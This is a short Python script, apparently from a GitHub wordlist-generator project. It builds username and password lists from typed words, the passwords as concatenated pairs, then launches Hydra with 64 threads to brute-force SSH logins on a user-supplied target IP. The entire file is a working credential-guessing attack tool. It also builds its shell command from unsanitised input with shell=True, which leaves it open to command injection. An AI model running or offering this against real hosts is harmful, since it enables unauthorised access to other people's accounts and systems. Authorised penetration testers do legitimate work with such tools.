#!/usr/bin/env python
#Intelligence wordlist generator https://github.com/zzztor/intelligence-wordlist-generator
import subprocess
import sys
    
def build_user_dict():
    wordlist = []
    dict_name = input("Filename of dictionary: ")
    if dict_name == "":
        dict_name = "UsernameDictionary.txt"
    while True:
        get_input = input("Enter input: ")
        if str(get_input).strip().lower() == "exit":
            break
        wordlist.append(get_input)
    output_file = open(dict_name, "a")
    for item in wordlist:
        output_file.write(item + "\n")
    return dict_name

def build_dict():
    wordlist = []
    dict_name = input("Filename of dictionary: ")
    if dict_name == "":
        dict_name = "PasswordDictionary.txt"
    while True:
        get_input = input("Enter input: ")
        if str(get_input).strip().lower() == "exit":
            break
        wordlist.append(get_input)
    pword = ""
    output_file = open(dict_name, "a")
    for item in wordlist:
        for item2 in wordlist:
            pword = "{}{}".format(item, item2)
            output_file.write(pword + "\n")
    return dict_name

def crack_password():
    user = input("Username: ")
    if user == "":
        username = input("Filename of username dictionary: ")
        if username == "":
            username = "UsernameDictionary.txt"
        elif username == "build":
            username = build_user_dict()
    target = input("Target IP: ")
    dictionary = input("Filename of password dictionary: ")
    if dictionary == "":
        dictionary = "PasswordDictionary.txt"
    elif dictionary == "build":
        dictionary = build_dict()
    if user == "":
        argument = "hydra -L {} -P {} -o PwordResults.txt -t 64 -f ssh://{}".format(username, dictionary, target)
    else:
        argument = "hydra -l {} -P {} -o PwordResults.txt -t 64 -f ssh://{}".format(user, dictionary, target)
    output = b""
    try:
        output = subprocess.check_output(argument, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as error:
        e = error.output
        print(e.decode())
    except Exception as e:
        print("Exception: " + e)
    except KeyboardInterrupt:
        print("\n""User interrupted process.")
        sys.exit()
    print(output.decode())

if __name__ == "__main__":
    crack_password()    
